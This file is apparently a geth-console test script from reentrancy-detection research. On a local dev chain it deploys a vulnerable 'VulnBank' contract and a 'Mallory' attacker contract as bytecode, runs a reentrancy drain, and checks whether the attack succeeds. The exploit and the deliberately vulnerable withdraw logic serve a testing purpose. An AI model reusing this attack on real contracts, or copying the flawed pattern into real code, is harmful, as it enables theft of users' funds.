// deploy javascript code for manual-lock.sol

var defaultPassword = "";

personal.newAccount(defaultPassword);
personal.newAccount(defaultPassword);
function unlockAllAccounts() {
  // this is the prefundend dev contract
  personal.unlockAccount(eth.accounts[0], defaultPassword);
  // we'll use this as "attacker"
  personal.unlockAccount(eth.accounts[1], defaultPassword);
}
unlockAllAccounts()
var attacker = eth.accounts[1];
var victim = eth.accounts[0];

console.log("prefunded balance: " + eth.getBalance(eth.accounts[0]))
console.log("transferring initial funds to attacker account")
eth.sendTransaction({from: eth.accounts[0], to: attacker, value: 1000000000000})
admin.sleepBlocks(3)
console.log("attacker account balance: " + eth.getBalance(attacker))

function transferSomething() {
  eth.sendTransaction({from: eth.accounts[0], to: eth.accounts[2], value: 100})
  admin.sleepBlocks(4)
}


var malloryContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"_vb","type":"address"}],"name":"attack","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);
var mallory_create = {
  from: attacker,
  data: '0x608060405234801561001057600080fd5b50610343806100206000396000f3fe608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063d018db3e146100e0575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663853828b66040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156100c657600080fd5b505af11580156100da573d6000803e3d6000fd5b50505050005b610122600480360360208110156100f657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610124565b005b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db03073ffffffffffffffffffffffffffffffffffffffff16316040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561020057600080fd5b505af1158015610214573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663853828b66040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561029e57600080fd5b505af11580156102b2573d6000803e3d6000fd5b505050503373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610313573d6000803e3d6000fd5b505056fea165627a7a7230582028a165aafca981cc939b796b9989d6d65d7d53f5975afae0bdac73be76b1e4b90029',
  gas: '4700000'
};


var vulnbankContract = web3.eth.contract([{"constant":false,"inputs":[],"name":"withdrawAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"address"}],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]);
var vulnbank_create = {
  from: web3.eth.accounts[0],
  data: '0x608060405234801561001057600080fd5b50610294806100206000396000f3fe608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063853828b61461005c578063d0e30db014610073578063f8b2cb4f1461007d575b600080fd5b34801561006857600080fd5b506100716100e2565b005b61007b6101d2565b005b34801561008957600080fd5b506100cc600480360360208110156100a057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610220565b6040518082815260200191505060405180910390f35b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490503373ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d8060008114610183576040519150601f19603f3d011682016040523d82523d6000602084013e610188565b606091505b50505060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905091905056fea165627a7a72305820bd4bd0db6a1e822e21cde0a44d0f8246d389cd2f8bf301587e6d34567a2d1df60029',
  gas: '4700000'
};

var mallory;

console.log("[+] deploying contracts");
var vulnbank = vulnbankContract.new(
	vulnbank_create,
  function (e, contract) {
    console.log("vulnbank:", e, contract);
    if (typeof contract.address !== 'undefined') {
      console.log('VulnBankX Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);

      console.log("making mallory contract")
      var _vb = contract.address;
      mallory = malloryContract.new(
        _vb,
				mallory_create,
        function (e, contract){
          console.log("mallory", e, contract);
          if (typeof contract.address !== 'undefined') {
            console.log('Mallory Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
          }
        })
    }
  })

transferSomething();
transferSomething();


function setupInitialState() {
  console.log("[+] Setting up initial state");
  vulnbank.deposit({from: eth.accounts[0], value: 1000000, gas: '4700000'});
}

function printStatus() {
  console.log("");
  console.log("Mallory  has " + eth.getBalance(mallory.address) + " wei");
  console.log("Mallory  has " + vulnbank.getBalance(mallory.address) + " wei in VulnBank");
  console.log("attacker has " + eth.getBalance(attacker) + " wei");
  console.log("attacker has " + vulnbank.getBalance(attacker) + " wei in VulnBank");
  console.log("victim   has " + vulnbank.getBalance(victim) + " wei in VulnBank");
  console.log("Vulnbank has " + eth.getBalance(vulnbank.address) + " wei");
  if (eth.getBalance(vulnbank.address) < vulnbank.getBalance(victim)) {
    console.log("Warning: VulnBank does not have enough funds to return victim's investment");
  }
  console.log("");
}


function triggerAttack() {
  transferSomething(); // sometimes it's stuck for some reason
  setupInitialState();
  transferSomething();

  printStatus();

  var preBalance = eth.getBalance(attacker);

  admin.sleepBlocks(3);

  console.log("[+] Triggering attack");
  var t = mallory.attack(vulnbank.address, {from: attacker, gas: '4700000', value: 1000000});
  admin.sleepBlocks(3);

  printStatus()

  var gains = (eth.getBalance(attacker) - preBalance);
  console.log("Attacker gained " + gains + " wei");
  if (gains > 0) {
    console.log("[+] Attack SUCCESS")
  } else {
    console.log("[+] Attack FAIL")
  }

  return t;
}


function getAttackTrace() {
  a = triggerAttack();
  return debug.traceTransaction(a);
}


function checkTrace() {
  // sereum only
  t = triggerAttack();
  return debug.checkTransaction(t)
}
